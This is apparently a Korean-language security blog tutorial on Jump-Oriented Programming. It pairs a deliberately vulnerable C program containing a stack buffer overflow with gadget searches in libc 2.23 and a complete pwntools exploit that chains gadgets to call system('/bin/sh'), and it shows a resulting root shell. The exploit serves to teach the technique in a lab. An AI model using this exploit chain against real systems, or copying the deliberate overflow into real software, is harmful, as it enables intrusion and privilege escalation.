---
title: Jump-Oriented Programming
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, jump-oriented programming]
math: true
mermaid: true
---

## Description

JOP는 JMP 명령을 사용해 프로그램 흐름을 제어하는 exploit 기술이다. JOP gadget은 "Exploit에 필요한 code + JMP 명령어"이다. JOP는 여러개의 gadget들을 실행시키기 위해 별도의 gadget과 구조가 필요하다.

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o jop jop.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
  
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}
  
void main(){
    seteuid(getuid());
    write(1,"Hello ROP\n",10);
    vuln();
}
```

72개 이상의 문자를 입력하면 return address를 덮어쓸 수 있다.

```
gdb-peda$ x/24gx $rbp
0x7fffffffe3b0: 0x4141414141414141  0x000000000040070a
```

## Exploit Method

1. ROP Gadget을 이용하여 rax에 system() 함수 주소 저장
2. JOP Gadget을 이용하여 RDI 레지스터에 "/bin/sh" 저장 후 "jmp rax" 명령어로 system() 함수 호출

### Find Gadget

```bash
root@bs-virtual-machine:~/pwnable/jop# rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.23.so -r 1 | grep "pop rax ; ret"
0x00033544: pop rax ; ret  ;  (1 found)
0x0003a727: pop rax ; ret  ;  (1 found)
0x0003a728: pop rax ; ret  ;  (1 found)
0x0003a7f7: pop rax ; ret  ;  (1 found)
0x0003a7f8: pop rax ; ret  ;  (1 found)
0x0003a8a0: pop rax ; ret  ;  (1 found)
0x0003a8a1: pop rax ; ret  ;  (1 found)
0x000abc07: pop rax ; ret  ;  (1 found)
0x00106272: pop rax ; ret  ;  (1 found)
0x00106273: pop rax ; ret  ;  (1 found)
0x001a1448: pop rax ; ret  ;  (1 found)
0x000caabc: pop rax ; retn 0x002F ;  (1 found)

root@bs-virtual-machine:~/pwnable/jop# rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.23.so -r 2 | grep "pop rdi ; jmp rax"
0x00104052: pop rdi ; jmp rax ;  (1 found)
```

## Exploit code

```python
from pwn import *

p = process('./jop')
p.recvline()
printf_addr = int(p.recvline().split(' ')[3],16)
libBase = printf_addr - 0x55800
system_addr = libBase + 0x45390
binsh_addr = libBase + 0x18cd57
pop_rax_ret = libBase + 0x33544
pop_rdi_jmp_rax = libBase + 0x104052

print('printf_addr: '+str(hex(printf_addr)))
print('libBase_addr: '+str(hex(libBase)))
print('system_addr: '+str(hex(system_addr)))
print('/bin/sh_addr: '+str(hex(binsh_addr)))
print('pop rax ; ret Gadget: '+str(hex(pop_rax_ret)))
print('pop rdi ; jmp rax Gadget: '+str(hex(pop_rdi_jmp_rax)))

payload = 'A'*72
payload += p64(pop_rax_ret)
payload += p64(system_addr)
payload += p64(pop_rdi_jmp_rax)
payload += p64(binsh_addr)

p.send(payload)
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/jop# python exploit.py 
[+] Starting local process './jop': pid 2257
printf_addr: 0x7fc07b8a5800
libBase_addr: 0x7fc07b850000
system_addr: 0x7fc07b895390
/bin/sh_addr: 0x7fc07b9dcd57
pop rax ; ret Gadget: 0x7fc07b883544
pop rdi ; jmp rax Gadget: 0x7fc07b954052
[*] Switching to interactive mode
$ 
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/root/pwnable/jop
```

## References
- [13.JOP(Jump-Oriented Programming)](https://www.lazenca.net/pages/viewpage.action?pageId=16810290)